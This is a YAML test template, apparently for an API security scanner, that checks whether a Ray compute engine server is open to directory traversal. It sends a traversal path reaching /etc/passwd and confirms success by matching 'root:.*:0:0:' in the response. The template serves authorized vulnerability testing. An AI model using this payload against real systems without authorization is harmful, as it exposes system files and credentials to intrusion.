id: RAY_STATIC_LFI
info:
  name: "Ray AI Compute Engine Directory Traversal Test"
  description: "The Ray AI Compute Engine Directory Traversal Test identifies vulnerabilities in Ray's distributed computing engine, where improper handling of user input allows attackers to exploit directory traversal attacks. By manipulating file paths, attackers can traverse outside the intended directory, potentially gaining unauthorized access to sensitive files or configurations on the system. This could expose critical information or allow attackers to manipulate system files. To mitigate such risks, Ray should implement strict input validation and secure file path handling to prevent unauthorized file access."
  details: "The Ray AI Compute Engine Directory Traversal Test evaluates the potential for attackers to manipulate file paths within Ray's distributed computing environment. If user input is not properly validated, attackers can craft requests with directory traversal sequences, such as `../`, to access files outside the intended directories. This could lead to the exposure of sensitive files, system configurations, or data stored on the server. Preventing such attacks requires ensuring that file paths are properly sanitized, restricted, and that sensitive directories are adequately protected from unauthorized access."
  impact: "The impact of a Ray AI Compute Engine Directory Traversal vulnerability is significant, as it could allow attackers to access sensitive files or configurations outside the intended directories. This could lead to the exposure of critical information, such as system settings, credentials, or application data, which could be used for further exploitation. Additionally, unauthorized access to sensitive files could disrupt the integrity of the system or result in privilege escalation. Implementing proper input validation and access controls is essential to prevent such risks."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: RAY_STATIC_LFI
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
  cwe:
    - CWE-98
    - CWE-22
  cve:
    - CVE-2021-39433
    - CVE-2023-22973


settings:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
wordLists:
  paths:
    - '/static/js/../../../../../../../../../../../../../../etc/passwd'
execute:
  type: single
  requests:
    - req:
        - modify_url: "${paths}"
        - modify_method: GET
        - replace_body: '{}'
validate:
  response_code:
    eq: 200
  response_payload:
    length:
      gt: 0
    regex: "root:.*:0:0:"
  response_headers:
    contains_either: "aiohttp"
    for_one:
      key:
        eq: "content-type"
      value:
        eq: "application/octet-stream"
strategy:
  run_once: /
